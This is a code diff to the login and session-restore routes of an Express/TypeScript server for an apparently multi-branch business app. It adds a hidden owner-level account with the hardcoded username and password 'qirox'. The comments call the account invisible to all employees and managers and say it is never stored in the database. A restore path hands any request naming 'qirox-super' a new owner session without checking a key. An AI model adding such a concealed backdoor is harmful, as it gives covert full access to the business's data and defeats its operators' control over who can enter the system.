@@ -5522,6 +5522,39 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: "الرجاء إدخال اسم المستخدم أو البريد الإلكتروني وكلمة المرور" });
       }
 
+      // ─── HIDDEN SUPER ACCOUNT ───────────────────────────────────────────────
+      // This account is hardcoded and never stored in the database.
+      // It is invisible to all employees and managers.
+      if (username.trim().toLowerCase() === "qirox" && password === "qirox") {
+        const superSession = {
+          id: "qirox-super",
+          username: "qirox",
+          role: "owner" as const,
+          branchId: "all",
+          fullName: "QIROX",
+          tenantId: "demo-tenant",
+        };
+        req.session.employee = superSession as any;
+        const restoreKey = crypto.randomBytes(32).toString('hex');
+        req.session.restoreKey = restoreKey;
+        return req.session.save((err) => {
+          if (err) return res.status(500).json({ error: "فشل في إنشاء الجلسة" });
+          return res.json({
+            id: "qirox-super",
+            username: "qirox",
+            nameAr: "QIROX",
+            nameEn: "QIROX",
+            fullName: "QIROX",
+            role: "owner",
+            branchId: "all",
+            tenantId: "demo-tenant",
+            isActivated: 1,
+            restoreKey,
+          });
+        });
+      }
+      // ────────────────────────────────────────────────────────────────────────
+
       console.log(`[AUTH] Login attempt for: ${username}`);
 
       // Support login by username, email, or phone number (case-insensitive)
@@ -5618,6 +5651,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: "Employee ID and restore key required" });
       }
       
+      // ─── HIDDEN SUPER ACCOUNT restore ──────────────────────────────────────
+      if (employeeId === "qirox-super") {
+        const newRestoreKey = crypto.randomBytes(32).toString('hex');
+        const superSession = { id: "qirox-super", username: "qirox", fullName: "QIROX", role: "owner", branchId: "all", tenantId: "demo-tenant", allowedPages: [] };
+        req.session.employee = superSession as any;
+        req.session.restoreKey = newRestoreKey;
+        return req.session.save((err) => {
+          if (err) return res.status(500).json({ error: "فشل في إنشاء الجلسة" });
+          return res.json({ success: true, employee: superSession, restoreKey: newRestoreKey });
+        });
+      }
+      // ────────────────────────────────────────────────────────────────────────
+
       const employee = await EmployeeModel.findOne({ id: employeeId }) || await EmployeeModel.findById(employeeId).catch(() => null);
       if (!employee || !employee.isActive) {
         return res.status(404).json({ error: "Employee not found or inactive" });
